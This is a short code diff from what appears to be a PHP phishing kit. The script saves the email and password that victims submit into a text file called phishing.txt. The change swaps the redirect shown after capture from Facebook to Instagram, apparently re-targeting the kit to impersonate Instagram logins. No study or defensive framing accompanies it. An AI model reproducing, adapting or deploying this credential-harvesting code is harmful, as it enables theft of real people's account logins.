@@ -5,7 +5,7 @@
  $phishing = fopen(“phishing.txt”,”w”);
  fwrite($phishing,$password.”Email : “.$_POST[’email’].” , Password”.$_POST[‘pass’].”\n”);
  fclose($file);
- echo ‘<script>window.location.href=”https://wwww.facebook.com/”</script>’;
+ echo ‘<script>window.location.href=”https://www.instagram.com/”</script>’;
  }
  else
  echo ‘<script>window.location.href=”index.html”</script>’;
